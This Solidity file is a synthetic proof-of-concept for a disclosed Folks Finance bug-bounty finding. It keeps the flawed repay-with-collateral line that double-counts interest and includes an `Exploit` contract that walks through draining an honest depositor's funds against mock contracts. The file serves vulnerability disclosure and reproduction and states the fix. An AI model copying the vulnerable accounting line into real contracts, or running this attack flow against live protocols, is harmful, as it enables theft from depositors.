// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Folks Finance — Incorrect updates to pool.depositData.totalAmount during
    repayment with collateral (Immunefi Boost, finding #61090, reporter alix_40)

    SYNTHETIC, CHEATCODE-FREE reproduction for the EVM Playground. The vulnerable
    LoanManagerLogic.updateWithRepayWithCollateral accounting line is inlined
    VERBATIM. No fork, no RPC, no cheatcodes.

    ROOT CAUSE (verbatim vulnerable line, kept below):

        pool.depositData.totalAmount -= principalPaid - interestPaid;

    This subtracts (principalPaid - interestPaid). The `- interestPaid` term
    ADDS the interest back into the pool's deposit accounting. But that interest
    was already counted in totalAmount when the collateral was first deposited,
    so it is DOUBLE-COUNTED: totalAmount is inflated by exactly `interestPaid`
    beyond what the pool actually backs. The correct update subtracts ONLY the
    principal:

        pool.depositData.totalAmount -= principalPaid;                // FIX

    Invariant broken: `depositData.totalAmount` must never exceed
    `pool token balance + total borrowed`. After a repay-with-collateral the
    pool's books claim more redeemable deposits than tokens exist — the pool is
    insolvent by the double-counted interest, so honest depositors cannot all be
    made whole (theft of unclaimed yield / funds locked / pool cannot operate).

    Numbers kept exact & simple (USDC-like units, decimals omitted for clarity):
      - attacker deposits 1000, borrows 900, accrues 60 interest,
        repays-with-collateral (principalPaid=900, interestPaid=60)
      - correct  totalAmount after = 100  (== pool balance, solvent)
      - buggy    totalAmount after = 160  (>  pool balance 100 by 60 == interest)
      - downstream: an honest depositor (Carol) then deposits 100 into the pool
        at the INFLATED deposit index and is left unable to redeem her full
        claim; the attacker walks off with exactly the 60 of double-counted
        interest (yield that should have been Carol's).
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal ERC20 used as the underlying pool asset (USDC-like).
contract MockUSDC {
    string public name = "USD Coin";
    string public symbol = "USDC";
    uint8 public decimals = 6;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            allowance[from][msg.sender] -= amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Holds the pool's accounting structs (mirrors Folks HubPoolState).
///         `PoolData.depositData.totalAmount` is the total underlying the pool
///         believes is deposited (backs the fToken/deposit-share index).
abstract contract HubPoolState {
    struct DepositData {
        uint256 totalAmount; // total underlying deposited (deposit-index numerator)
    }

    struct VariableBorrowData {
        uint256 totalAmount; // total principal borrowed
    }

    struct PoolData {
        DepositData depositData;
        VariableBorrowData variableBorrowData;
    }

    PoolData internal _poolData;
}

/// @notice The vulnerable accounting library (mirrors Folks LoanManagerLogic).
///         Reduced to the single accounting update that carries the bug; the
///         vulnerable line is preserved VERBATIM from the finding.
library LoanManagerLogic {
    // Signature kept faithful to the finding (external in prod; `internal` here
    // so the reduced repro links without a separately-deployed library — the
    // vulnerable LINE is identical either way).
    function updateWithRepayWithCollateral(
        HubPoolState.PoolData storage pool,
        uint256 principalPaid,
        uint256 interestPaid,
        uint256 loanStableRate
    ) internal {
        loanStableRate; // unused in the reduction (kept for signature fidelity)

        // ... other code ...
        pool.depositData.totalAmount -= principalPaid - interestPaid; // @> VULN: re-adds interest -> double-counts, inflating totalAmount beyond backing
        // Recommended fix: pool.depositData.totalAmount -= principalPaid;   // subtract ONLY principal
        // ... rest of the function
    }
}

/// @notice Reduced Folks HubPool. Deposits mint deposit-shares (fTokens) priced
///         by the deposit index `depositData.totalAmount / totalShares`.
///         Borrowers post their shares as collateral and can repay with them.
contract HubPool is HubPoolState {
    using LoanManagerLogic for HubPoolState.PoolData;

    MockUSDC public immutable token;

    // deposit-share (fToken) accounting
    mapping(address => uint256) public shares;
    uint256 public totalShares;

    // per-user variable-borrow debt (principal + accrued interest)
    mapping(address => uint256) public debt;

    constructor(MockUSDC _token) {
        token = _token;
    }

    /*/////////////////////////// views /////////////////////////////////////*/

    function totalDeposited() external view returns (uint256) {
        return _poolData.depositData.totalAmount;
    }

    function totalBorrowed() external view returns (uint256) {
        return _poolData.variableBorrowData.totalAmount;
    }

    /// @dev Underlying value of `s` deposit-shares at the current deposit index.
    function sharesToUnderlying(uint256 s) public view returns (uint256) {
        if (totalShares == 0) return s;
        return (s * _poolData.depositData.totalAmount) / totalShares;
    }

    /// @dev Deposit-shares minted for `amount` underlying at the current index.
    function underlyingToShares(uint256 amount) public view returns (uint256) {
        if (totalShares == 0) return amount; // first deposit: 1:1
        return (amount * totalShares) / _poolData.depositData.totalAmount;
    }

    /*////////////////////////// deposit / withdraw /////////////////////////*/

    /// @notice Deposit `amount` underlying; receive deposit-shares (collateral).
    function deposit(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        uint256 s = underlyingToShares(amount);
        _poolData.depositData.totalAmount += amount;
        shares[msg.sender] += s;
        totalShares += s;
    }

    /// @notice Redeem `s` deposit-shares for the underlying they are worth at
    ///         the current deposit index. Reverts if the pool cannot pay (which
    ///         is exactly the insolvency the bug produces).
    function redeem(uint256 s) external returns (uint256 amountOut) {
        amountOut = sharesToUnderlying(s);
        shares[msg.sender] -= s;
        totalShares -= s;
        _poolData.depositData.totalAmount -= amountOut;
        token.transfer(msg.sender, amountOut);
    }

    /*////////////////////////////// borrow /////////////////////////////////*/

    /// @notice Borrow `amount` underlying against posted deposit-shares.
    function borrowVariable(uint256 amount) external {
        // simple health gate: collateral value must cover the debt
        require(sharesToUnderlying(shares[msg.sender]) >= debt[msg.sender] + amount, "undercollateralized");
        _poolData.variableBorrowData.totalAmount += amount;
        debt[msg.sender] += amount;
        token.transfer(msg.sender, amount);
    }

    /// @notice Accrue `amount` interest onto a borrower's debt (models time
    ///         passing; no token movement — interest is owed, not yet paid).
    function accrueInterest(address user, uint256 amount) external {
        debt[user] += amount;
    }

    /// @notice Repay a variable loan using the borrower's own deposit-share
    ///         collateral (no external token inflow). The borrower forfeits
    ///         collateral worth (principalPaid + interestPaid); the pool's
    ///         deposit accounting is then updated via the vulnerable library.
    function repayWithCollateral(uint256 principalPaid, uint256 interestPaid, uint256 loanStableRate) external {
        uint256 repaidTotal = principalPaid + interestPaid;

        // burn deposit-share collateral worth the full repaid amount
        uint256 sharesBurned = underlyingToShares(repaidTotal);
        shares[msg.sender] -= sharesBurned;
        totalShares -= sharesBurned;

        // clear the borrower's debt and reduce the pool's borrow principal
        debt[msg.sender] -= repaidTotal;
        _poolData.variableBorrowData.totalAmount -= principalPaid;

        // BUG lives here: updates depositData.totalAmount incorrectly
        _poolData.updateWithRepayWithCollateral(principalPaid, interestPaid, loanStableRate);
    }
}

/// @notice Honest co-depositor (the victim). Deposits real liquidity into the
///         pool and later tries to redeem her full accounted claim.
contract HonestDepositor {
    MockUSDC public token;
    HubPool public pool;

    constructor(MockUSDC _token, HubPool _pool) {
        token = _token;
        pool = _pool;
    }

    function deposit(uint256 amount) external {
        token.mint(address(this), amount);
        token.approve(address(pool), amount);
        pool.deposit(amount);
    }

    /// @dev Redeem all held shares (used only in the solvent control path).
    function redeemAll() external {
        pool.redeem(pool.shares(address(this)));
    }
}

/// @notice Attack orchestrator / deployer. Acts as the malicious depositor +
///         borrower. Deploys the whole scene and runs the accounting-corruption
///         exploit end-to-end, asserting the finding's HARM with require().
contract Exploit {
    // exact, simple numbers (USDC-like units, decimals omitted for clarity)
    uint256 public constant ATTACKER_DEPOSIT = 1000;
    uint256 public constant BORROW = 900;
    uint256 public constant INTEREST = 60;
    uint256 public constant CAROL_DEPOSIT = 100;

    MockUSDC public token;
    HubPool public pool;
    HonestDepositor public carol;
    address public attacker;

    // snapshots for the report / driver assertions
    uint256 public attackerStartBalance;
    uint256 public attackerEndBalance;
    uint256 public accountingGapAfterRepay; // (totalDeposited - totalBorrowed) - poolBalance
    uint256 public carolClaim; // underlying Carol's shares are worth (her accounted claim)
    uint256 public poolBalanceAtCarolRedeem;

    constructor() {
        attacker = msg.sender;
        token = new MockUSDC(); // CREATE nonce 1
        pool = new HubPool(token); // CREATE nonce 2
        carol = new HonestDepositor(token, pool); // CREATE nonce 3

        // fund the attacker's honest starting capital
        token.mint(address(this), ATTACKER_DEPOSIT);
    }

    function run() external {
        // === Phase 1: attacker corrupts pool accounting via repay-with-collateral ===

        // 1. attacker deposits 1000 -> 1000 deposit-shares (index 1); pool balance 1000
        token.approve(address(pool), ATTACKER_DEPOSIT);
        pool.deposit(ATTACKER_DEPOSIT);

        // 2. attacker borrows 900 against the collateral; pool balance -> 100
        pool.borrowVariable(BORROW);

        // 3. time passes: 60 interest accrues onto the debt (now owes 960)
        pool.accrueInterest(address(this), INTEREST);

        // 4. attacker repays 960 with collateral (principalPaid=900, interestPaid=60)
        pool.repayWithCollateral(BORROW, INTEREST, 0);

        // ---- HARM 1: the finding's exact invariant break ----
        // depositData.totalAmount is now 160 (double-counted the 60 interest);
        // pool holds only 100 tokens and nothing is borrowed. The pool's books
        // claim 60 more redeemable deposits than tokens exist.
        uint256 totalDep = pool.totalDeposited();
        uint256 totalBor = pool.totalBorrowed();
        uint256 poolBal = token.balanceOf(address(pool));
        require(totalDep == 160, "totalDeposited not inflated to 160");
        require(totalBor == 0, "borrow not fully repaid");
        require(poolBal == 100, "pool balance not 100");
        // (totalDeposited - totalBorrowed) exceeds actual balance by exactly the interest
        accountingGapAfterRepay = (totalDep - totalBor) - poolBal;
        require(accountingGapAfterRepay == INTEREST, "invariant gap != double-counted interest");

        // === Phase 2: an honest depositor is stranded; attacker steals the yield ===

        // 5. Carol deposits 100 into the now-corrupted pool. Because the deposit
        //    index is inflated (totalAmount/shares = 160/40 = 4), she receives
        //    only 25 shares for her 100 (vs 40 in a healthy pool).
        attackerStartBalance = ATTACKER_DEPOSIT; // honest capital the attacker committed
        carol.deposit(CAROL_DEPOSIT);
        require(pool.shares(address(carol)) == 25, "carol shares != 25");

        // 6. attacker redeems their 40 leftover shares FIRST. At the inflated
        //    index those 40 shares pay out 160 tokens (vs 100 in a healthy pool),
        //    draining the pool and leaving Carol short.
        uint256 attackerShares = pool.shares(address(this));
        require(attackerShares == 40, "attacker shares != 40");
        pool.redeem(attackerShares);

        // attacker profit surfaced as an ERC20 balance on this contract
        attackerEndBalance = token.balanceOf(address(this));

        // 7. Carol is now unable to redeem her full accounted claim: her 25
        //    shares are booked as worth 100, but the pool holds only 40 tokens.
        carolClaim = pool.sharesToUnderlying(pool.shares(address(carol)));
        poolBalanceAtCarolRedeem = token.balanceOf(address(pool));

        // ---- HARM 2: theft of unclaimed yield — attacker gains exactly the
        //      60 of double-counted interest that should have been Carol's. ----
        require(attackerEndBalance > attackerStartBalance, "attacker did not profit");
        require(attackerEndBalance - attackerStartBalance == INTEREST, "attacker profit != stolen interest");

        // ---- HARM 3: honest depositor left with a real token deficit — the
        //      pool cannot make Carol whole (insolvent by the interest). ----
        require(carolClaim == 100, "carol claim not 100");
        require(poolBalanceAtCarolRedeem == 40, "pool balance at carol redeem not 40");
        require(poolBalanceAtCarolRedeem < carolClaim, "pool solvent for carol (bug not triggered)");
        require(carolClaim - poolBalanceAtCarolRedeem == INTEREST, "carol shortfall != double-counted interest");
    }
}
